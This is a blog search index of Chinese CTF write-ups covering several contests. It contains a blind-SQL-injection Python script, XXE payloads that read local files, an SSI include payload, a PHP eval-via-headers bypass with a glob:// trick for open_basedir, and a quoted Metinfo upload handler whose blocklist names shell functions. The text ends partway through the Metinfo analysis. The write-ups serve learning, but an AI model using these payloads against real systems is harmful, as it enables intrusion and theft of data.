<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2018高校网络信息安全管理运维挑战赛Web_Writeup</title>
    <url>/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>emmmm，很久没有好好的打比赛了，基本都是滑水，认真打的时候又被一些脑洞卡一天，难受，这次的题比较简单，所以Writeup也就简单些写了，可惜不会逆向，不然应该有那么点可能AK吧。</p>
<h3 id="SimpleBBS"><a href="#SimpleBBS" class="headerlink" title="SimpleBBS"></a>SimpleBBS</h3><p>一个普通的BBS，进去随手在登入框输了个‘ ‘ ’就报错了，直接把SQL语句都爆出来了</p>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-f0e585b5e166c7dd.png" alt><br>甩sqlmap爆破，爆破的时候把level设置高一些，很多问我怎么他们没爆出来，应该就是因为level的原因吧。flag放在bbs库flag表flag字段里。</p>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-3da046af8ea5f69d.png" alt></p>
<h3 id="SimpleBlog"><a href="#SimpleBlog" class="headerlink" title="SimpleBlog"></a>SimpleBlog</h3><p>这道题目很明显是二次注入，由于很讨厌写注入的题，所以也是很后面才写，主要逻辑在于注册用户时我们插入SQL查询语句，登入后也在主页面提示分数为0什么的信息，所以在Final Exam页面测试，如果返回值显示的分数为非0，那么则表示注入的查询语句查询正确，若返回显示的分数为0，则说明查询失败，所以典型的盲注了，构造payload：’ or if((ascii(substr((select flag from flag),1,1))=1),1,0)=’1’ or ‘ 作为注册用户名，这里坑了一下，刚开始用的是 and，在insert的时候 and 和 &amp;&amp; 不会当作逻辑运算符执行，所以用 or 或者 || ，写个盲注脚本就好了。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import string</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">url = <span class="string">'http://210.32.4.20/register.php'</span></span><br><span class="line">url_2 = <span class="string">'http://210.32.4.20/login.php'</span></span><br><span class="line">url_3 = <span class="string">'http://210.32.4.20/answer.php'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,50):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(32,126):</span><br><span class="line">		<span class="attribute">ss</span>=requests.session()</span><br><span class="line">		payload = <span class="string">"\' or if((ascii(substr((select flag from flag),"</span> + str(i) + <span class="string">",1))="</span> + str(j) + <span class="string">"),1,0)='1' or \'"</span></span><br><span class="line">		post_an = &#123;<span class="string">'1.a'</span>:<span class="string">'on'</span>&#125;</span><br><span class="line">		post_data = &#123;<span class="string">'username'</span>:payload,<span class="string">'password'</span>:<span class="string">'123'</span>&#125;</span><br><span class="line">		r = ss.post(<span class="attribute">url</span>=url,data=post_data)</span><br><span class="line">		login = ss.post(<span class="attribute">url</span>=url_2,data=post_data)</span><br><span class="line">		an = ss.post(<span class="attribute">url</span>=url_3,data=post_an)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'Your grades is 0'</span> <span class="keyword">not</span> <span class="keyword">in</span> an.content:</span><br><span class="line">			e = chr(j)</span><br><span class="line">			result = result + e</span><br><span class="line">			<span class="builtin-name">print</span> result</span><br><span class="line">			break</span><br></pre></td></tr></table></figure>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-3aa8fbe13ff8acf7.png" alt></p>
<h3 id="SimpleExtensionExplorerInjection"><a href="#SimpleExtensionExplorerInjection" class="headerlink" title="SimpleExtensionExplorerInjection"></a>SimpleExtensionExplorerInjection</h3><p>题目写得很清楚这题是XXE的点，所以先抓一个http request包</p>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-6f46836651fe64cb.png" alt><br>application/json应该都很熟悉了，把json改成xml进行XXE注入，参考文章：<a href="https://landgrey.me/XMLBeam-XXE-Simple-Analysis/，发现构造：" target="_blank" rel="noopener">https://landgrey.me/XMLBeam-XXE-Simple-Analysis/，发现构造：</a></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>Cyc1e<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">age</span>&gt;</span>11<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>时有一样的回显，那么就是CVE-2018-1259的洞了，构造payload：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-1722740048a470fb.png" alt></p>
<h3 id="SimplePrintEventLogger"><a href="#SimplePrintEventLogger" class="headerlink" title="SimplePrintEventLogger"></a>SimplePrintEventLogger</h3><p>这道题算非预期了，出题人木有把两个题目分开，所以导致捡漏了，看题目描述是同一个组件造成的RCE，那解法应该是参考：<a href="https://trex-tbag.github.io/2018/04/14/spring-data-common-cve/（没有去复现尝试）。" target="_blank" rel="noopener">https://trex-tbag.github.io/2018/04/14/spring-data-common-cve/（没有去复现尝试）。</a><br>由于和上一题共用同一个环境，flag都放在根目录下，那也就是文件名的问题，但是XXE是可以列目录的，构造payload：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-cda1cc7ce24b816a.png" alt></p>
<p>可以直接列出更目录，很清楚的，RCE这题的flag就摆在这了，捡漏捡漏。</p>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-f7c81d5cf632f968.png" alt></p>
<h3 id="SimpleServerInjection"><a href="#SimpleServerInjection" class="headerlink" title="SimpleServerInjection"></a>SimpleServerInjection</h3><p>题目提示为SSI，刚开始看成了SSTI，一直在怒怼PHP的模版注入，坑了我好一段时间……既然是SSI，那就可以利用include来尝试包含本地文件</p>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-67fbe593dc44f929.png" alt>我们利用include virtual，构造payload：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">name=<span class="comment">&lt;!--%23include virtual="flag" --&gt;</span></span><br></pre></td></tr></table></figure>
<p>就可以得到flag，这里主要在于#号需要urlencode一下。</p>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-51fe24d6a7b94456.png" alt></p>
<h3 id="SimpleWasmReverse"><a href="#SimpleWasmReverse" class="headerlink" title="SimpleWasmReverse"></a>SimpleWasmReverse</h3><p>这题最后卡wasm逆向上了，蛮写写思路</p>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-f218ccef0572771d.png" alt>把flag.js下载到本地分析，可以看到调用了一个flag.wasm文件</p>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-8443127bdac0d0e2.png" alt>)可以下载到flag.wasm进行分析，找到了一篇类似题目的writeup：<a href="https://tipi-hack.github.io/2018/04/01/quals-NDH-18-assemblyme.html，参照题目进行js调试判断调用函数，在check()函数上下断点跟进，可以看到调用了wasm中的$func53函数" target="_blank" rel="noopener">https://tipi-hack.github.io/2018/04/01/quals-NDH-18-assemblyme.html，参照题目进行js调试判断调用函数，在check()函数上下断点跟进，可以看到调用了wasm中的$func53函数</a><br><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-be2040dcaa949ed3.jpg" alt></p>
<p>所以接下来要做的主要就是反编译wasm文件，找到$func53函数进行分析，奈何wasm反编译后是3M的C源码。。。。。。而且变量名都变了，作为一个逆向只好爆破什么的来说，到这就放弃了，思路肯定是没毛病的了，分析调用的函数就可以的到flag{xxxxxx}，页面提交就可以得到flag的吧，坐等Writeup</p>
<h5 id="题目相对比较简单，差一题ak比较可惜，不过也不会逆向，木有办法，仅供学习。"><a href="#题目相对比较简单，差一题ak比较可惜，不过也不会逆向，木有办法，仅供学习。" class="headerlink" title="题目相对比较简单，差一题ak比较可惜，不过也不会逆向，木有办法，仅供学习。"></a>题目相对比较简单，差一题ak比较可惜，不过也不会逆向，木有办法，仅供学习。</h5>]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>二次注入</tag>
        <tag>XXE</tag>
        <tag>SSI</tag>
      </tags>
  </entry>
  <entry>
    <title>护网杯预选赛两个头大的Web题</title>
    <url>/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/</url>
    <content><![CDATA[<h1 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h1><p>拿到AAoHAR1WX1VQVlNVU1VRUl5XXyMjI1FWJ1IjUCQnXlZWXyckXhs=，提示是异或，没想到的是和多少异或，所以签到题卡了半天（菜哭），写脚本测试</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-3839db9d9d10a201.png" alt></p>
<p>每一位和0~105异或的时候可以得到flag：flag{09360535374819EEE70A4E6BA8009AB8}</p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="一、EASY-TORNADO"><a href="#一、EASY-TORNADO" class="headerlink" title="一、EASY_TORNADO"></a>一、EASY_TORNADO</h2><p>在hint.txt得到了signature的算法为md5(cookie_secret + md5(filename))，有在flag.txt里得到了flag文件为/fllllllllllag，那思路很明确就是算出signature，然后读取/fllllllllllag文件里的内容就可以，其中cookie_secret是未知的，通过/error?msg= 可以发现msg参数存在ssti</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-9ad29bc329b751e2.png" alt>接下来就是爬坑的半天，下意识以为cookie_secret是在cookie里，打了半天的cookie，都不知道该调用什么函数来做了……  然后在handle对象中发现了cookie_secret（为什么会在这个地方呢，有点迷！）</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-7ca1b782b9107adb.png" alt></p>
<p>拿到cookie_secret了题目就简单了，写一个计算signature的php代码：</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-27ffeedbdb560700.png" alt></p>
<p>计算得出signature，直接访问payload：/file?filename=/fllllllllllag&amp;signature=240eaef73c2f70d5e30051d91417a18c</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-97ff2886094c7e53.png" alt></p>
<h2 id="二、ITSHOP"><a href="#二、ITSHOP" class="headerlink" title="二、ITSHOP"></a>二、ITSHOP</h2><p>这题懵了比较久，半天没有什么思路的。最终通过条件竞争和整数溢出解题。<br>首先发现可以条件竞争，因为要5包大辣条才可以换1包辣条之王，而只给了买4包的钱，那么要么通过伪造数据，要么就是条件竞争用5元买多包辣条了……这个逻辑没毛病，各种伪造测试不通，就尝试条件竞争，用brupsuit多线程跑，把线程设置大一些</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-88c5e43f56f94734.png" alt></p>
<p>就可以买到超过4包数量的大辣条。</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-e652be648b88d8db.png" alt></p>
<p>第二点在于整数溢出，毕竟想要条件竞争得到9999999*5包大辣条不可能，所以要么伪造数据，要么就是整数溢出，伪造数据前面说了是不通的，所以就尝试整数溢出,长整型整数最大为0XFFFFFFFFFFFFFFFF,那么0XFFFFFFFFFFFFFFFF + 1 就可以造成溢出，又因为5包大辣条换一包辣条之王，所以可以换的辣条之王的最大值应该是0XFFFFFFFFFFFFFFFF/5，所以批量换辣条之王的数量应该是0XFFFFFFFFFFFFFFFF/5 + 1 转化为整数为：3689348814741910324</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-f6791ad3e9d54e69.png" alt></p>
<p>成功溢出换得<strong>*****</strong>（反正用不完的）数量的辣条之王，接下来直接兑换Flag就好了</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-20e546370620f0f8-1583312993362.png" alt></p>
<h4 id="时间比较短，这两题花了些时间，然后又双叒叕开始滑水了……"><a href="#时间比较短，这两题花了些时间，然后又双叒叕开始滑水了……" class="headerlink" title="时间比较短，这两题花了些时间，然后又双叒叕开始滑水了……"></a>时间比较短，这两题花了些时间，然后又双叒叕开始滑水了……</h4>]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>逻辑</tag>
        <tag>cookie_secret</tag>
      </tags>
  </entry>
  <entry>
    <title>RCTF-R-CURSIVE</title>
    <url>/2018/10/14/RCTF-R-CURSIVE/</url>
    <content><![CDATA[<p>这次的rctf没怎么看，傍晚开始看 r-cursive 这题，源码特别简单:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">sha1($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) === <span class="string">'9944105bfb8294278dbf87f4c52e8476ebf9ab68'</span> ?: <span class="keyword">die</span>();</span><br><span class="line"><span class="string">';'</span> === preg_replace(<span class="string">'/[^\W_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'cmd'</span>]) ? <span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]) : show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>这里主要有正则，<code>preg_replace(&#39;/[^\W_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;cmd&#39;])</code>，\w 就很烦人了，所以首先要做的就是过这个正则达到任意执行。通过构造cmd=eval(next(getallheaders()));在请求头里插入可执行代码来达到任意执行(这里不止next可以用，主要就是决定你构造代码放在header的什么位置，还有implode，end…..都可以用)我用的是next就是，执行代码插在user_agent中：</p>
<p><img src="/2018/10/14/RCTF-R-CURSIVE/8418106-c17d1e0247b7b179-1583307607135.png" alt></p>
<p>那么接下来也就是要列出目录，找到flag文件了，这里卡了好久，主要要做的就是绕过openbase_dir的限制，把出了/tmp目录和index.php所在目录除外的其他目录给列出来</p>
<p><img src="/2018/10/14/RCTF-R-CURSIVE/8418106-7fd934ffcfedf20f.png" alt></p>
<p>最后通过opendir + glob://协议列出目录：</p>
<p><code>if($dh=opendir(&quot;glob:///var\*/www\*/sandbox\*/\*&quot;)){while(($file=readdir($dh))!==false){echo&quot;$file\n&quot;;}closedir($dh);}</code></p>
<p>一波谜一样的操作</p>
<p><img src="/2018/10/14/RCTF-R-CURSIVE/8418106-f8dd88d7fe7e973c.png" alt></p>
<p>发现众多token文件夹后面夹生这init.php和php.ini，猜测flag应该是放在init.php里了，但是我们的权限是在 78854209fa4889d51dd0016ceab319f852d90ec9 文件夹下面的，因为vhost_alias的配置的原因，所以我们默认进入网站的时候是在token目录下的，因为openbase_dir的限制，直接读取init.php文件是读不到的</p>
<p><img src="/2018/10/14/RCTF-R-CURSIVE/8418106-a753f240ddb7aaf1.png" alt></p>
<p>这里可以想想因为我们默认是在token文件夹里，所以我们可以正常读取index.php的源码，那如果我们出了token文件夹，那也就可以正常读取init.php文件了所以我们可以修改请求时的URL:<a href="http://78854209fa4889d51dd0016ceab319f852d90ec9.sandbox.r-cursive.ml:1337/78854209fa4889d51dd0016ceab319f852d90ec9/?cmd=eval(next(getallheaders()" target="_blank" rel="noopener">http://78854209fa4889d51dd0016ceab319f852d90ec9.sandbox.r-cursive.ml:1337/78854209fa4889d51dd0016ceab319f852d90ec9/?cmd=eval(next(getallheaders()</a>)); 修改请求头中的HOST为:.sandbox.r-cursive.ml:1337，利用file_get_contents()函数来读取init.php文件</p>
<p><img src="/2018/10/14/RCTF-R-CURSIVE/8418106-fa9223d7f5547395.png" alt></p>
<p>这样也就跨出限制，成功读取到flag。</p>
<p><strong>比赛滑水，也就只看了这道题，其他的题看都没看，不过这次比赛题目质量真心好，有时间都可以做做，仅写来供自己学习记录用。</strong></p>
]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>open_basedir</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>2017上海赛线下攻防Web题分析</title>
    <url>/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>首先会回过头来重新分析一次这道web题主要是因为上次线下的时候全场一直在打了一个洞，最后成信的师傅用重置数据库方法，从后台getshell一路追分，这里先膜一发。这次web题的框架是Metinfo 5.3.17的。</p>
<h2 id="0x01-后台getshell"><a href="#0x01-后台getshell" class="headerlink" title="0x01 后台getshell"></a>0x01 后台getshell</h2><p>这个洞也可以说是坑了一波，以前都调过Metinfo的后台恢复数据库文件getshell，在：安全—&gt;备份与恢复 中通过上传数据库备份.zip文件getshell，这里主要是因为:admin\include\uploadify.php</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">elseif($type==<span class="string">'skin'</span>)&#123;</span><br><span class="line">/*模板文件*<span class="regexp">/</span></span><br><span class="line"><span class="regexp">$filetype=explode('.',$_FILES['Filedata']['name']);</span></span><br><span class="line"><span class="regexp">if($filetype[count($filetype)-1]=='zip')&#123;</span></span><br><span class="line"><span class="regexp">if(stristr($met_file_format,'zip') === false)&#123;</span></span><br><span class="line"><span class="regexp">echo $lang_jsx36;</span></span><br><span class="line"><span class="regexp">die();</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/if(!is_writable('../</span>../templates/<span class="string">'))@chmod('</span>../../templates/<span class="string">',0777);</span></span><br><span class="line"><span class="string">$filenamearray=explode('</span>.zip<span class="string">',$_FILES['</span>Filedata<span class="string">']['</span>name<span class="string">']);</span></span><br><span class="line"><span class="string">$skin_if=$db-&gt;get_one("SELECT * FROM &#123;$met_skin_table&#125; WHERE skin_file='</span>&#123;$filenamearray[<span class="number">0</span>]&#125;<span class="string">'");</span></span><br><span class="line"><span class="string">if($skin_if)&#123;</span></span><br><span class="line"><span class="string">$metinfo=$lang_loginSkin;</span></span><br><span class="line"><span class="string">&#125;else&#123;</span></span><br><span class="line"><span class="string">$f = new upfile('</span>zip<span class="string">','</span>../../templates/<span class="string">','</span><span class="string">','</span><span class="string">');</span></span><br><span class="line"><span class="string">if($f-&gt;get_error())&#123;</span></span><br><span class="line"><span class="string">echo $f-&gt;get_errorcode();</span></span><br><span class="line"><span class="string">die();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">if(file_exists('</span>../../templates/<span class="string">'.$filenamearray[0].'</span>.zip<span class="string">'))$filenamearray[0]='</span>metinfo<span class="string">'.$filenamearray[0];</span></span><br><span class="line"><span class="string">$met_upsql = $f-&gt;upload('</span>Filedata<span class="string">',$filenamearray[0]);</span></span><br><span class="line"><span class="string">include "pclzip.lib.php";</span></span><br><span class="line"><span class="string">$archive = new PclZip('</span>../../templates/<span class="string">'.$filenamearray[0].'</span>.zip<span class="string">');</span></span><br><span class="line"><span class="string">if($archive-&gt;extract(PCLZIP_OPT_PATH, '</span>../../templates/<span class="string">') == 0)$metinfo=$archive-&gt;errorInfo(true);</span></span><br><span class="line"><span class="string">$list = $archive-&gt;listContent();</span></span><br><span class="line"><span class="string">$error=0;</span></span><br><span class="line"><span class="string">foreach($list as $key=&gt;$val)&#123;</span></span><br><span class="line"><span class="string">if(preg_match("/\.(asp|aspx|jsp)/i",$val[filename]))&#123;</span></span><br><span class="line"><span class="string">$error=1;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">if(!is_dir('</span>../../templates/<span class="string">'.$val[filename])&amp;&amp;preg_match("/\.(php)/i",$val[filename]))&#123;</span></span><br><span class="line"><span class="string">$danger=explode('</span><span class="params">|','preg_replace|</span>assert<span class="params">|dirname|</span>file_exists<span class="params">|file_get_contents|</span>file_put_contents<span class="params">|fopen|</span>mkdir<span class="params">|unlink|</span>readfile<span class="params">|eval|</span>cmd<span class="params">|passthru|</span>system<span class="params">|gzuncompress|</span>exec<span class="params">|shell_exec|</span>fsockopen<span class="params">|pfsockopen|</span>proc_open<span class="params">|scandir');</span></span><br><span class="line"><span class="params">$ban='preg_replace|</span>assert<span class="params">|eval|</span>\$_POST<span class="params">|\$_GET';</span></span><br><span class="line"><span class="params">foreach($danger as $key1 =&gt; $val1)&#123;</span></span><br><span class="line"><span class="params">$str=file_get_contents('../../templates/'.$val[filename]);</span></span><br><span class="line"><span class="params">$str=str_replace(array('\'','"','.'),'',$str);</span></span><br><span class="line"><span class="params"><span class="keyword">if</span>(preg_match("/([^A-Za-z0-9_]$val1)[\r\n\t]&#123;0,&#125;([\[\(])/i",$str))&#123;</span></span><br><span class="line"><span class="params">$error=1;</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params"><span class="keyword">if</span>(preg_match('/('.$ban.')/i',$str))&#123;</span></span><br><span class="line"><span class="params">$error=1;</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params">@unlink('../../templates/'.$filenamearray[0].'.zip');</span></span><br><span class="line"><span class="params"><span class="keyword">if</span>($error)&#123;</span></span><br><span class="line"><span class="params">foreach($list as $key=&gt;$val)&#123;</span></span><br><span class="line"><span class="params"><span class="keyword">if</span>(is_dir('../../templates/'.$val[filename]))&#123;</span></span><br><span class="line"><span class="params">@deldir('../../templates/'.$val[filename]);</span></span><br><span class="line"><span class="params">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="params">@unlink('../../templates/'.$val[filename]);</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params">$metinfo='含有危险函数，禁止上传！！';</span></span><br><span class="line"><span class="params">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="params">$metinfo='1$'.$filenamearray[0];</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params">&#125;</span></span><br></pre></td></tr></table></figure>
<p>上传的.zip文件会自动解压，上传成功后在/templates目录下生成shell，由于本次源码被调整过，在恢复备份文件处有一个资源调用的问题，导致打开的时候特别慢，可以说没法利用吧，而这次主要是利用另一个上传点，直接通过修改上传文件类型来上传.php文件：安全-&gt;安全与效率-&gt;上传文件<br><img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-bc2325f23d35affd.png" alt><br>这种getshell的方法不要智商的，所以就不多说了。</p>
<h2 id="0x02-混淆源码命令执行"><a href="#0x02-混淆源码命令执行" class="headerlink" title="0x02 混淆源码命令执行"></a>0x02 混淆源码命令执行</h2><p>利用点：produ/picture.inc.php文件，源码进行混淆过，所以挖掘的时候必须首先解混淆，这里我是直接上网进行源码修复的，修复出来简单修改一下变量也基本就能看懂。</p>
